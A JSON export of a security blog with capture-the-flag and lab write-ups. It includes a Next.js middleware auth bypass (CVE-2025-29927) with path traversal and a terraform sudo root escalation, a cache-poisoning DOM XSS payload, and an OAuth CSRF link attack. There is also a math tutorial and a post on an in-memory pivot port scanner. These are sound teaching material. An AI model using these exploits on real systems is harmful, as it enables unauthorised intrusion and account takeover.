
[{"content":"","date":"9 January 2026","externalUrl":null,"permalink":"/tags/authentication_bypass/","section":"Tags","summary":"","title":"Authentication_bypass","type":"tags"},{"content":"","date":"9 January 2026","externalUrl":null,"permalink":"/tags/cve-2025-29927/","section":"Tags","summary":"","title":"CVE-2025-29927","type":"tags"},{"content":"","date":"9 January 2026","externalUrl":null,"permalink":"/tags/htb/","section":"Tags","summary":"","title":"Htb","type":"tags"},{"content":" Overview # This machine starts with a nextjs website that is found to be vulnerable to CVE-2025-29927. Exploiting this, we are able to bypass authentication and access an api endpoint that allows us to read local files on the server. This is leveraged to retrieve the password of the user jeremy and login to the box. This user is able to run the terraform binary with sudo, this can be exploited in order to get root access to the box.\nPort Scanning # # Nmap 7.94SVN scan initiated Fri Jan 9 22:45:49 2026 as: nmap -A -T4 -p- -oN nmap_tcp 10.129.242.162 Nmap scan report for 10.129.242.162 Host is up (0.044s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://previous.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jan 9 22:50:15 2026 -- 1 IP address (1 host up) scanned in 266.83 seconds Website: Port 80 # Navigating to http://10.129.242.162 redirects us to previous.htb\nRedirected to previous.htb Let\u0026rsquo;s add it to our host file and go back again:\nHomepage Based on the information on this page, the website seems to make use of middleware. Clicking on \u0026ldquo;Get Started\u0026rdquo; presents us with a login form:\nLogin Form The X-Powered-By header indicates that the server is running Next.js:\nRunning Next.js So far we know that:\nThe server is running Next.js It uses middleware And there is some authentication that we need to bypass Authentication Bypass # Looking for vulnerabilities on Next.js, we find this research (Next.js and the corrupt middleware: the authorizing artifact) from zhero that lead to CVE-2025-29927.\nThis vulnerability allows bypassing authorization checks within a Next.js application, if the authorization check occurs in middleware.\nIn the blog post, more specifically in Section 3.2: Max recursion depth, we see that we need to send the x-middleware-subrequest header set to a colon seperated list of the string \u0026ldquo;middleware\u0026rdquo; repeated at least 5 times (which is the MAX_RECURSION_DEPTH). Simply put, we have to send this header:\nx-middleware-subrequest: middleware:middleware:middleware:middleware:middleware To set the header, we can use Burp Match \u0026amp; Replace, or this extension in firefox:\nSetting the x-middleware-subrequest header with the firefox extension After setting the header, if we go back to the homepage and click \u0026ldquo;Get started\u0026rdquo;, we are directed to /docs without needing to authenticate:\nAuthentication Bypass successful Local File Read # Going to /docs/examples, we get a link to download an example HelloWorld script at /api/download?example=hello-world.ts:\nPotential LFI ?? Let\u0026rsquo;s try accessing other files with this:\nCan read local file /etc/passwd As we can see, we are able to read other files in the system via path traversal. Since this is a next js application, we should start enumerating the project\u0026rsquo;s directory to gain more information. Looking at the package.json, we see that the app is using next-auth:\nnext-auth in package.json One place we can look at is the Credentials Provider as it might contain sensitive information:\nFound Hardcoded credentials! Foothold as jeremy # With the password we found, we can login via ssh as jeremy and retrieve the user flag:\nUser Flag Retrieved ! Privesc # Our current user jeremy can run terraform as root:\nJeremy sudo privileges To exploit this, we first need to:\nCreate a directory, here I will create /home/jeremy/exploit_dir In this directory create a bash script with the filename terraform-provider-examples_v0.1_linux_amd64. This script will be executed as root. Finally copy the .terraformrc config present in /home/jeremy, and change /usr/local/go/bin to /home/jeremy/exploit_dir After that, we can simply call the binary while setting the TF_CLI_CONFIG_FILE variable to our modified config file. Here is the full attack to retrieve the root flag:\njeremy@previous:~$ ls docker exploit_dir exploit_terraformrc user.txt jeremy@previous:~$ cat exploit_terraformrc provider_installation { dev_overrides { \u0026#34;previous.htb/terraform/examples\u0026#34; = \u0026#34;/home/jeremy/exploit_dir\u0026#34; } direct {} } jeremy@previous:~$ ls exploit_dir/ terraform-provider-examples_v0.1_linux_amd64 jeremy@previous:~$ cat exploit_dir/terraform-provider-examples_v0.1_linux_amd64 #!/bin/bash cp /root/root.txt /home/jeremy/root.txt chown jeremy:jeremy /home/jeremy/root.txt jeremy@previous:~$ TF_CLI_CONFIG_FILE=exploit_terraformrc sudo /usr/bin/terraform -chdir\\=/opt/examples apply ╷ │ Warning: Provider development overrides are in effect │ │ The following provider development overrides are set in the CLI configuration: │ - previous.htb/terraform/examples in /home/jeremy/exploit_dir │ │ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published releases. ╵ ╷ │ Error: Failed to load plugin schemas │ │ Error while loading schemas for plugin components: Failed to obtain provider schema: Could not load the schema for provider previous.htb/terraform/examples: failed to │ instantiate provider \u0026#34;previous.htb/terraform/examples\u0026#34; to obtain schema: Unrecognized remote plugin message: │ Failed to read any lines from plugin\u0026#39;s stdout │ This usually means │ the plugin was not compiled for this architecture, │ the plugin is missing dynamic-link libraries necessary to run, │ the plugin is not executable by this process due to file permissions, or │ the plugin failed to negotiate the initial go-plugin protocol handshake │ │ Additional notes about plugin: │ Path: /home/jeremy/exploit_dir/terraform-provider-examples_v0.1_linux_amd64 │ Mode: -rwxrwxr-x │ Owner: 1000 [jeremy] (current: 0 [root]) │ Group: 1000 [jeremy] (current: 0 [root]) │ .. ╵ jeremy@previous:~$ ls docker exploit_dir exploit_terraformrc root.txt user.txt jeremy@previous:~$ cat root.txt [REDACTED] ","date":"9 January 2026","externalUrl":null,"permalink":"/writeups/previous/","section":"Writeups","summary":"","title":"HTB - Previous","type":"writeups"},{"content":"","date":"9 January 2026","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"9 January 2026","externalUrl":null,"permalink":"/tags/medium/","section":"Tags","summary":"","title":"Medium","type":"tags"},{"content":"","date":"9 January 2026","externalUrl":null,"permalink":"/tags/middleware/","section":"Tags","summary":"","title":"Middleware","type":"tags"},{"content":"","date":"9 January 2026","externalUrl":null,"permalink":"/tags/nextjs/","section":"Tags","summary":"","title":"Nextjs","type":"tags"},{"content":"","date":"9 January 2026","externalUrl":null,"permalink":"/","section":"squ4r00t's","summary":"","title":"squ4r00t's","type":"page"},{"content":"","date":"9 January 2026","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"9 January 2026","externalUrl":null,"permalink":"/tags/terraform/","section":"Tags","summary":"","title":"Terraform","type":"tags"},{"content":"","date":"9 January 2026","externalUrl":null,"permalink":"/writeups/","section":"Writeups","summary":"","title":"Writeups","type":"writeups"},{"content":"","date":"6 December 2025","externalUrl":null,"permalink":"/tags/cache_poisoning/","section":"Tags","summary":"","title":"Cache_poisoning","type":"tags"},{"content":"","date":"6 December 2025","externalUrl":null,"permalink":"/tags/dom_xss/","section":"Tags","summary":"","title":"Dom_xss","type":"tags"},{"content":"","date":"6 December 2025","externalUrl":null,"permalink":"/tags/portswigger/","section":"Tags","summary":"","title":"Portswigger","type":"tags"},{"content":" Lab Description # This lab contains a DOM-based vulnerability that can be exploited as part of a web cache poisoning attack. A user visits the home page roughly once a minute. Note that the cache used by this lab has stricter criteria for deciding which responses are cacheable, so you will need to study the cache behavior closely.\nTo solve the lab, poison the cache with a response that executes alert(document.cookie) in the visitor\u0026rsquo;s browser.\nFinding an unkeyed input # First, we start by looking for an unkeyed input that can be used to elicit a malicious response. For this, we can use the Burp extension Param Miner.\nAfter scanning the home page (which is cacheable), we find that the X-Forwarded-Host header is an unkeyed input:\nX-Forwarded-Host header found by Param Miner Next, we need to figure out in which way does this header affect the response.\nFor this, we can send the header with an arbitrary value set and see if it is reflected in the response:\nValue of the X-Forwarded-Host header reflected in the response We can see that the value that we entered was set to the host attribute of the data object. Let\u0026rsquo;s see where else this object is used:\nValue used inside initGeoLocate() We can see above that the value is passed as an argument to the initGeoLocate() function, which is imported from /resources/js/geolocate.js:\nValue used inside initGeoLocate() This function will fetch some json data from the given url, then it will append the value of the country attribute directly (without sanitization) to the innerHTML sink. This is vulnerable to a DOM XSS if the json data can be altered.\nThanks to the X-Forwarded-Host header, we can specify from which url the json data is imported and that response is cacheable. This means that we can alter that url for other users as well, making the DOM XSS distributed.\nConducting the attack # All we need to do is to serve the following json on the exploit server at /resources/json/geolocate.json:\n{ \u0026#34;country\u0026#34;: \u0026#34;\u0026lt;img src=x onerror=alert(document.cookie)\u0026gt;\u0026#34; } We also need to add the Access-Control-Allow-Origin: * header to allow cross origin resource sharing.\nExploit Server After storing the exploit, we need to poison the cache with the exploit server\u0026rsquo;s domain using the X-Forwarded-Host header:\nPoisonning the cache After refreshing the home page, we see the alert and we solved the lab:\nLab solved! ","date":"6 December 2025","externalUrl":null,"permalink":"/writeups/cp_dom_xss/","section":"Writeups","summary":"","title":"Portswigger - Cache Poisoning DOM XSS","type":"writeups"},{"content":"","date":"6 December 2025","externalUrl":null,"permalink":"/tags/xss/","section":"Tags","summary":"","title":"Xss","type":"tags"},{"content":"","date":"12 October 2025","externalUrl":null,"permalink":"/tags/algorithm/","section":"Tags","summary":"","title":"Algorithm","type":"tags"},{"content":" In this blog post, I explain the Euclidian Algorithm (+extended) and how to implement them in python.\nPrerequisite: Modulus Operator # First, we need to understand the modulus operator.\nThe modulus operator, often represented by the percent character (%) in many programming languages, returns the rest of the division between 2 operands.\nFor example, let\u0026rsquo;s say we have 2 integers a=5 and b=2. Then a mod b will be equal to 1\n~ ❯ python3 Python 3.13.7 (main, Aug 14 2025, 00:00:00) [GCC 14.3.1 20250523 (Red Hat 14.3.1-1)] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; a=5 \u0026gt;\u0026gt;\u0026gt; b=2 \u0026gt;\u0026gt;\u0026gt; a%b 1 We can also think of it as:\nHow much would remain if we put the maximum possible number of bs inside a ?\nIn our example, q=2 is the maximum number of times we can fit b into a without going over. And the remainder (to reach the value of a) is r=1. This can be seen in the below figure:\nVisual Representation This gives the following relation: \\[ a = bq + r \\] Euclidian Algorithm # The Euclidian algorithm is used to get the Greatest Common Divisor d of 2 integers a and b (ie. the biggest number that divides both a and b).\n\\[ d = gcd(a,b) \\]In order to find the gcd, the algorithm relies on the following claim:\nif a and b are both divisible by d, then r = a mod b is also divisible by d\nbut how can we prove it ?\nApproach 1: math\nWhat we know: both a and b are divisible by d.\nWhat we are trying to prove: r = a mod b is also divisible by d.\nInfo An integer x being divisible by another integer y means that x can be written: $$ x = ny $$ where n is also an integer.\nKnowing this, a and b could be written:\n$$ a = nd \\\\ b = md $$Using this and the earlier formula (a=bq+r) we get:\n$$ r = a - bq \\\\ r = (nd) - (md)q \\\\ r = (n - mq) * d $$r can be written as an integer (n-mq) times d, therefore r is divisible by d.\nApproach 2: visual intuition\nIn this approach, we need to think of x being divisible by y as x being made of n blocks of size y (x, y, n integers).\nBlocks illustration In the above figure, we see that a is made of n blocks of size d and b is made of m blocks of size d. This is the same as a=n*d and b=m*d\nIn this illustration, we can see that the remainder r will always be made up of a whole number of blocks of size d, thus will always be divisible by d. This is because r is what remains when you substract b \u0026ldquo;q times\u0026rdquo; from a (ie. r = a - bq) and since a and b are made of the same unit blocks, naturally the remainder will also be the same.\nNow coming back to the Euclidian Algorithm.\nWe have shown that if a and b are divisible by d, then r = a mod b is also divisible by d.\nAnd we know that a and b are both divisible by gcd(a,b), which means that r = a mod b is also divisible by gcd(a,b).\nSo r, being smaller than a and b, will naturally have the same gcd as them.\nWe can therefore write:\n$$ gcd(a,b) = gcd(a,r) = gcd(b,r) $$This helps a lot in reducing the possibilities, since finding the gcd for smaller numbers is easier that larger ones.\nImplementation # The algorithm will first compute r = a % b.\nIf r is equal to 0, it will return min(a,b)\nElse it will return gcd(min(a,b), r)\ndef gcd(a, b): r = a % b if r == 0: return min(a, b) return gcd(min(a, b), r) print(gcd(12,44)) Extended Euclidian Algorithm # The extended euclidan algorithm is a way to find 2 integers x and y such that:\n$$ x * a+y * b=gcd(a,b) $$To start, let\u0026rsquo;s look at the simplest case first: when r=0.\nIf we are given 2 integers a and b (a \u0026gt; b) and r = a % b = 0, then b (the smallest) is the gcd.\nIn this case, x would be 0 and y would be 1:\n$$ 0*a+1*b=gcd(a,b)=b $$This will be the base case of the recursion.\nNow let\u0026rsquo;s try to understand the different steps involved.\nRecursion Steps At the start, we are given 2 integers A0 and B0 (A0 \u0026gt; B0) and we are trying to find:\nd = gcd(A0, B0) x and y such that $$x*A0+y*B0=d$$ At step 0, we compute r0 = A0 % B0, if it\u0026rsquo;s not 0 we move to step 1 with A1 = B0 and B1 = r0.\nAt step 1, we repeat the same until we reach step n.\nAt step n, we compute rn = An % Bn and find that it is equal to 0. We have reached the base case, so we return d=Bn, x=0, y=1:\n$$ d = B_n = 0*An + 1*Bn $$Then, we go back to step n-1. Here we need to recalculate x and y for An-1 and Bn-1, because the previous values we had were for An and Bn. For each step we need to have right values of x and y, until we ultimately get back to step 0 where we\u0026rsquo;ll have the final values.\nWe can generalize this problem in the following manner:\nKnowing the values x and y for step k, what are the values for step k-1 ?\nFrom the arrows in the illustration, we can see:\nAk = Bk-1 Bk = rk-1 = Ak-1 - Bk-1 * qk-1 Knowing this, we can find the new values of x and y:\n$$ d = xA_k + yB_k \\\\ d = xB_{k-1} + y r_{k-1} \\\\ d = xB_{k-1} + y(A_{k-1} - B_{k-1}q_{k-1}) \\\\ d = xB_{k-1} + yA_{k-1} - yB_{k-1}q_{k-1} \\\\ d = yA_{k-1} + (x - yq_{k-1})B_{k-1} $$In the end we have:\n$$ x_{k-1} = y_{k} \\\\ y_{k-1} = x - yq_{k-1} $$ Implementation # We now have everything we need to implement the algorithm.\ndef f(a, b): # Calculating the remainder r = a % b # Base case if r == 0: arr = [b, 0, 1] return arr else: arr = f(b, r) # Calculating the new values of x and y new_x = arr[2] new_y = arr[1] - arr[2] * (a//b) arr = [arr[0], new_x, new_y] return arr a = 12 b = 44 res = f(a, b) print(f\u0026#34;{res[0]} = {res[1]} * {a} + {res[2]} * {b}\u0026#34;) ","date":"12 October 2025","externalUrl":null,"permalink":"/posts/ext_euclid_alg/","section":"Posts","summary":"","title":"Extended Euclidian Algorithm Explained","type":"posts"},{"content":"","date":"12 October 2025","externalUrl":null,"permalink":"/tags/math/","section":"Tags","summary":"","title":"Math","type":"tags"},{"content":"","date":"12 October 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"12 October 2025","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":"","date":"26 September 2025","externalUrl":null,"permalink":"/tags/networking/","section":"Tags","summary":"","title":"Networking","type":"tags"},{"content":"","date":"26 September 2025","externalUrl":null,"permalink":"/tags/pivoting/","section":"Tags","summary":"","title":"Pivoting","type":"tags"},{"content":"","date":"26 September 2025","externalUrl":null,"permalink":"/tags/port_scanning/","section":"Tags","summary":"","title":"Port_scanning","type":"tags"},{"content":"If you\u0026rsquo;ve ever tried scanning ports on a machine present in an internal network through a pivot machine, you might have noticed that it can be very slow at times and that the results of the scan aren\u0026rsquo;t always very reliable (often times missing open ports :/).\nOnce solution that comes to mind might be to transfer nmap (or another port scanner) on the pivot machine and then run the scan from there.\nThis method, although effective in terms of packet transmission (the scanning traffic is isolated in the pivot-target segment), presents some drawbacks such as:\nLack of stealth: Uploading a binary to the host is quite noisy and can be very easily detected Missing services: Sometimes nmap threw errors related to some missing services (although still able to do a basic port scan) Inconvenience: Transfer the binary \u0026gt; Login to the host \u0026gt; Running the binary \u0026gt; Copying the results \u0026gt; Pasting them, there are a lot of steps just for a simple port scan. sps (Simple Port Scanner) is a tool that tries to circumvent these hurdles by giving us the ability to specify on which host we want to run the port scan from.\nQuick Reminder on Pivoting # Pivoting is a technique used to access internal networks that are not directly reachable by the intermediary of pivots. A pivot host is a machine that is both in our network and the internal network that we want to access:\nBasic Pivoting Scenario In the image above, as the attacker (10.10.50.20) we cannot directly access Server 1 (172.16.10.3). However there is a host that we can reach, which in turn can reach Server 1. That host is the Pivot here having the IP addresses: 10.10.50.100 \u0026amp; 172.16.10.2.\nIn this situation, we can pivot into the internal network (172.16.10.0/24) by tunneling our traffic through the pivot host (also called Jump Host). That way, if we want to send a packet to Server 1, we would send it first to the Pivot, which will then relay it to Server 1.\nUsing tools like ligolo-ng or chisel we can easily do just that.\nPort Scanning through Pivots # When scanning hosts that are in an internal network from an external network, we usually have to make a compromise between speed and accuracy/stability. If we send too many requests, we will probably lose some packets which might result in missing open ports making the scan results unreliable. Furthermore, it can also break the tunnel that we constructed to access the internal network.\nScanning through a pivot (default way) In the above image, we can see 3 hosts:\nAttacker which is in an external network trying to port scan a server that is situated in the internal network Pivot relaying the packets from Attacker to the target server Server to scan which is the target server being scanned We can also see dashed arrows reprensenting the flow of packets being transfered in the different network segments.\nIn this scenario, let\u0026rsquo;s say we are probing port 80. Before we get back info whether the port is opened or closed, the information would have went through 4 segments (2 for request, 2 for response). And that\u0026rsquo;s if we\u0026rsquo;re doing a SYN scan. In this case we can see that it\u0026rsquo;s not unlikely that one of the packets might be lost, especially when our connection is not very stable (typical when pivoting).\nTo avoid all these problems we can, like mentionned in the introduction, perform the scan from the pivot machine. But without having to write on disk (for the sake of stealth).\nSPS (SimplePortScanner) # sps is a TCP port scanner written in Go to which you can specify a host (which you have ssh access to) to run the scan from (without touching disk).\nIt will connect to the specified host with the credentials provided. Upon successful authentication, it executes a command that will retrieve the compiled binary of sps hosted on a HTTP server or SMB share that you\u0026rsquo;ve set up before running sps.\nThe command that is executed and whether a HTTP server or SMB share should be setup, both depends on the OS of the host perfoming the scan. This is explained in sps\u0026rsquo; README.\nOnce the binary is retrieved it will be executed in memory and the results will be returned on STDOUT.\nPort scanning through pivot using sps On the above image, we can see that the arrows between the attacker and the pivot are not dashed anymore. This illustrates that we are not sending each single packet (for a single probe) all the way from attacker to target, rather we will send one \u0026ldquo;big request\u0026rdquo; to the pivot, which will do the work and returns us back the results.\nOn the perspective of the attacker, it\u0026rsquo;s like the scan was ran from their machine.\n","date":"26 September 2025","externalUrl":null,"permalink":"/posts/portscanning-through-pivots/","section":"Posts","summary":"","title":"SPS: A convenient way of scanning through network pivots","type":"posts"},{"content":"","date":"26 September 2025","externalUrl":null,"permalink":"/tags/tool/","section":"Tags","summary":"","title":"Tool","type":"tags"},{"content":"","date":"10 May 2025","externalUrl":null,"permalink":"/tags/csrf/","section":"Tags","summary":"","title":"Csrf","type":"tags"},{"content":"","date":"10 May 2025","externalUrl":null,"permalink":"/tags/dbus/","section":"Tags","summary":"","title":"Dbus","type":"tags"},{"content":"","date":"10 May 2025","externalUrl":null,"permalink":"/tags/hard/","section":"Tags","summary":"","title":"Hard","type":"tags"},{"content":" Overview # Oouch is a hard difficulty Linux machine featuring web applications that use the OAuth authorization framework. Absence of a CSRF Token is leveraged to link an administrative account to our account, providing access to sensitive information. This information is used to register a new client application and steal the authorization code. This code is used to gain an access token, which provides unrestricted access to user resources. A misconfigured DBus server is then exploited through uWSGI in order to execute code in the context of root.\nPort Scanning # From the results of the nmap scan, we see that we have 4 ports open: 21, 22, 5000 and 8000\nPORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 ftp ftp 49 Feb 11 2020 project.txt 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 5000/tcp open http nginx 1.14.2 | http-title: Welcome to Oouch |_Requested resource was http://10.10.10.177:5000/login?next=%2F |_http-server-header: nginx/1.14.2 8000/tcp open rtsp FTP # From the nmap results, we can see that we have anonymous login allowed and we can access project.txt:\nftp 10.10.10.177 Connected to 10.10.10.177. 220 qtc\u0026#39;s development server Name (10.10.10.177:squ4r00t): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||48291|) 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 49 Feb 11 2020 project.txt 226 Directory send OK. ftp\u0026gt; get project.txt local: project.txt remote: project.txt 229 Entering Extended Passive Mode (|||40240|) 150 Opening BINARY mode data connection for project.txt (49 bytes). 100% |***************************************************************************************| 49 65.01 KiB/s 00:00 ETA 226 Transfer complete. 49 bytes received in 00:00 (0.94 KiB/s) ftp\u0026gt; exit 221 Goodbye. And the file contains the following:\nFlask -\u0026gt; Consumer Django -\u0026gt; Authorization Server From this, we can assume that there is an Oauth system in place and that the Django server is the Authorization Server and the Flask server is the consumer / client app.\nWebsite at :5000 # Navigating to http://10.10.10.177, we are redirected to /login?next=%2f:\nLogin Page We can also register an account at /register:\nRegister Page Let\u0026rsquo;s try to register an account\nRegistering an Account After logging in with the newly created account, we get this page:\nAfter login We have several other pages on the side bar:\nMenu: which is just the home page Menu Profile: This page shows user\u0026rsquo;s information including connected accounts, which might be handy later Profile Page Password Change: Allows us to change password. Uses a CSRF token that is verified Password Change Page Documents: This page is only accessible to admin users Documents About: From this page we learn that this web app is the authorization server About Contact: We are presented a form to report bugs to the administrator Contact However, XSS attempts are detected and stopped:\nHacking Attempt Detected! Let\u0026rsquo;s try to see if there are other pages that we can\u0026rsquo;t access from the web page UI:\nffuf -u \u0026#39;http://10.10.10.177:5000/FUZZ\u0026#39; -w /usr/share/wordlists/dirb/common.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.10.177:5000/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ [Status: 302, Size: 237, Words: 22, Lines: 4, Duration: 91ms] about [Status: 302, Size: 247, Words: 22, Lines: 4, Duration: 63ms] contact [Status: 302, Size: 251, Words: 22, Lines: 4, Duration: 67ms] documents [Status: 302, Size: 255, Words: 22, Lines: 4, Duration: 51ms] home [Status: 302, Size: 245, Words: 22, Lines: 4, Duration: 86ms] login [Status: 200, Size: 1828, Words: 414, Lines: 55, Duration: 93ms] logout [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 72ms] oauth [Status: 302, Size: 247, Words: 22, Lines: 4, Duration: 48ms] profile [Status: 302, Size: 251, Words: 22, Lines: 4, Duration: 79ms] register [Status: 200, Size: 2109, Words: 517, Lines: 64, Duration: 132ms] We see a new endpoint, /oauth:\nOAuth Endpoint After adding consumer.oouch.htb and oouch.htb to the hosts file, and trying to go to http://consumer.oouch.htb:5000/oauth/connect, we are redirected to the following URL: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82\u0026amp;response_type=code\u0026amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token\u0026amp;scope=read which is the site on port 8000.\nLet\u0026rsquo;s also add authorization.oouch.htb to our hosts file.\nWebsite at :8000 # Navigating once again to the previous URL, we land on this page:\nOAuth Server Login Page :8000/login Before moving forward, let\u0026rsquo;s have a look at how Oauth works.\nHow Oauth works ? # Oauth is an authorization framework that allows one website (consumer/client app) to access a user\u0026rsquo;s data from another website (oauth server/provider) without knowing the user\u0026rsquo;s password.\nFor more information -\u0026gt; https://portswigger.net/web-security/oauth\nLet\u0026rsquo;s take a look at the following diagram from PortSwigger showing the different steps involved:\nOAuth Worflow for Authorization Code Grant Type Authorization request: This is the first request that initiates the Oauth process. It is sent by the consumer to the Oauth server through the user\u0026rsquo;s browser. In our case, it corresponds to this request:\nAuthorization Request In this request, the consumer also sends his client_id in order to authenticate to the Oauth server, the response_type parameter indicating the grant type, redirect_uri which is the page that the user will be redirected to after consenting, finally scope indicating operations to be done with the accessed data (\u0026lsquo;read\u0026rsquo; in this case).\nUser Login \u0026amp; Consent: After the first request is sent, the user is sent to the OAuth provider page so that they can login and consent to authorize the client application to access their data.\nAuthorization Code Grant: Once the user consents, they are redirected to the URL that was provided through the redirect_uri parameter along with the authorization code. This authorization code is linked to the user account on the OAuth server/provider website.\nAccess Token Request: Using the previous authorization code, the client application will contact directly the Oauth server (without going through the user\u0026rsquo;s browser) asking for a token.\nAccess Token Grant: After doing some verifications, the OAuth server will send the token to the client application, allowing it to access user data.\nAPI Call: The client application makes an API call to retrieve user data\nUser Data: The OAuth server checks the token and sends the data.\nUnderstanding Oouch\u0026rsquo;s OAuth Flow # Going back a little bit, we notice that when we tried to connect another account to our existing account on consumer.oouch.htb:5000 through the /oauth/connect endpoint, it triggered the OAuth flow by redirecting us to the OAuth server on authorization.oouch.htb:8000/oauth/authorize along with the following parameters:\nclient_id response_type redirect_uri scope This represent the first step, or the \u0026ldquo;Authorization request\u0026rdquo;, referring to the previous diagram.\nAfter that we\u0026rsquo;re then redirected once again to the login page of the OAuth server at authorization.oouch.htb:8000/login/ where the application expects us to login and consent (this is step 2).\nHowever, right now we don\u0026rsquo;t have an account on the OAuth server website. So we\u0026rsquo;ll need to find a way to create one there.\nIf we go to authorization.oouch.htb:8000/, we see the following:\nauthorization.oouch.htb:8000/ We see in the notice that we can provide SSH credentials. This might be interesting, but for now let\u0026rsquo;s just create an account by going to /signup\nauthorization.oouch.htb:8000/signup After creating the account and logging in, we are sent to /home:\nauthorization.oouch.htb:8000/home In this page we\u0026rsquo;re shown the relevant endpoints that are involved in the OAuth process:\n/oauth/authorize: which is the endpoint where the Authorization request is sent (step 1). /oauth/token: which we don\u0026rsquo;t know the use of yet. Now that we have an account on the OAuth server (Oouch), let\u0026rsquo;s connect this account to the account that we have on consumer.oouch.htb:5000 by once again going to consumer.oouch.htb:5000/oauth/connect.\nThis time, since we\u0026rsquo;re already logged in on the OAuth server, we are directly asked to consent:\nAuthorization Prompt in Burp Once we click on Authorize, we\u0026rsquo;re redirected to our user profile at consumer.oouch.htb:5000/profile, and we see that our account on Oouch (the OAuth server) is now linked:\nOouch account linked! When we clicked on Authorize, the following POST request was sent:\nConsent POST Request which lead to a redirect to: consumer.oouch.htb:5000/oauth/connect/token?code=\u0026lt;AUTH_CODE\u0026gt;.\nWhen we hit that endpoint, it will check if the authorization code (code parameter) is valid. If so, the account linked to the authorization code (in this case the account we created on the OAuth server: squ4r00t_oouch) will be linked to the consumer web application.\nWe also notice something interesting: the state parameter is empty. The absence of this parameter potentially means that an attacker can initiate an OAuth flow themselves before tricking a user\u0026rsquo;s browser into completing it, similar to a traditional CSRF attack.\nOAuth Exploitation: Part 1 # We\u0026rsquo;ll initiate the OAuth process normally until we arrive at the moment we\u0026rsquo;re redirected to consumer.oouch.htb:5000/oauth/connect/token?code=\u0026lt;AUTH_CODE\u0026gt; at which point (without following the redirect!) we\u0026rsquo;ll try to make the administrator access that link. This will tie our account (the one on the OAuth server: squ4r00t_oouch) to the administrator\u0026rsquo;s account (the one on the consumer: port 5000).\nWe\u0026rsquo;ll send the following payload in the contact form:\n\u0026lt;a href=\u0026#34;http://consumer.oouch.htb:5000/oauth/connect/token?code=a1b2.....xyz\u0026#34;\u0026gt;click here!\u0026lt;/a\u0026gt; Make sure to replace the authorization code with a valid one tied to your account on the Authorization server.\nCSRF link sent to admin After a few second, we see that our Oouch account not linked anymore:\nNo Accounts Connected. Let\u0026rsquo;s try to logout, and login with our Oouch account at consumer.oouch.htb:5000/oauth/login:\nLogged in as qtc. We can see that our Oouch account was linked to qtc\u0026rsquo;s account.\nNow if we go to /documents, we see something different:\nqtc\u0026rsquo;s documents. From this we learn:\nWe have developer credentials we can use for \u0026ldquo;application registration\u0026rdquo; develop:supermegasecureklarabubu123! /api/get_user to get user data (returns a 403) /oauth/authorize supports GET method There is an ssh key to be found somewhere OAuth Exploitation: Part 2 # Let\u0026rsquo;s try to find others endpoints under /oauth/\nffuf -u \u0026#39;http://authorization.oouch.htb:8000/oauth/FUZZ\u0026#39; -w /usr/share/wordlists/dirb/common.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://authorization.oouch.htb:8000/oauth/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ applications [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 50ms] Going to /oauth/applications presents us with a login prompt and trying the credentials we found in qtc\u0026rsquo;s documents doesn\u0026rsquo;t work.\nHTTP Basic Auth After some more enumeration, we find the /oauth/applications/register endpoint where the credentials worked.\nWe are then directed to the application registration page:\nApplication Registration Page 